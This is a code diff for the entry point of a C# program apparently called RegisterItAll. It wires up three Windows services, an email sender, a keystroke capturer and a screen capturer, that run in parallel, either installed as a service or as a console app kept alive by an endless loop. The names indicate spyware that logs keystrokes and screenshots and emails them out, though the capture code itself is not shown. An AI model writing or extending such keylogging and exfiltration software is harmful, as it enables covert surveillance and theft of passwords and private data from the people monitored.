@@ -1,4 +1,6 @@
-﻿using System.Linq;
+﻿using RegisterItAll.Services;
+using RegisterItAll.Services.Base;
+using System.Linq;
 using System.ServiceProcess;
 
 namespace RegisterItAll
@@ -7,22 +9,26 @@ namespace RegisterItAll
     {
         public static void Main(string[] args)
         {
+            ExecutableAsConsoleApplicationService[] servicesToRun = new ExecutableAsConsoleApplicationService[]
+            {
+                new EmailSenderService(),
+                new KeystrokesCapturerService(),
+                new ScreenCapturerService(),
+            };
+
             if (args.ToList().Contains("-RunAsConsoleApplication"))
             {
-                RegisterItAllService RegisterItAllService = new RegisterItAllService();
+                foreach (ExecutableAsConsoleApplicationService service in servicesToRun)
+                {
+                    // This call is not awaited in order to execute all the Services in parallel way.
+                    service.ExecuteAsConsoleApplication(args);
+                }
 
-                RegisterItAllService.ExecuteAsConsoleApplication(args);
+                while (true) { }
             }
             else
             {
-                ServiceBase[] ServicesToRun;
-
-                ServicesToRun = new ServiceBase[]
-                {
-                    new RegisterItAllService()
-                };
-
-                ServiceBase.Run(ServicesToRun);
+                ServiceBase.Run(servicesToRun);
             }
         }
     }
